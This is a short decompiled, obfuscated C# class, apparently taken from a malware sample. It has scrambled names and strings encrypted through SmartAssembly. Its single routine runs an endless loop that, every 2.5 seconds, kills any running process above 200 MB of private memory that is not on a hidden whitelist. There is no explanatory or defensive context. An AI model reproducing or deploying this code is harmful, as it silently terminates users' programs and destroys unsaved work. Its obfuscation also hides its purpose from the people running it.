using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace uBrdXrCSgnwM;

public static class NFfXdvdfDuMJc
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void OXBNPpJpRsmmn()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107407618)) && !process.ProcessName.Contains(getString_0(107408089)) && !process.ProcessName.Contains(getString_0(107408112)) && !process.ProcessName.Contains(getString_0(107408103)) && !process.ProcessName.Contains(getString_0(107408058)) && !process.ProcessName.Contains(getString_0(107408077)) && !process.ProcessName.Contains(getString_0(107408032)) && !process.ProcessName.Contains(getString_0(107408019)) && !process.ProcessName.Contains(getString_0(107408038)) && !process.ProcessName.Contains(getString_0(107407993)) && !process.ProcessName.Contains(getString_0(107408004)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static NFfXdvdfDuMJc()
	{
		Strings.CreateGetStringDelegate(typeof(NFfXdvdfDuMJc));
	}
}
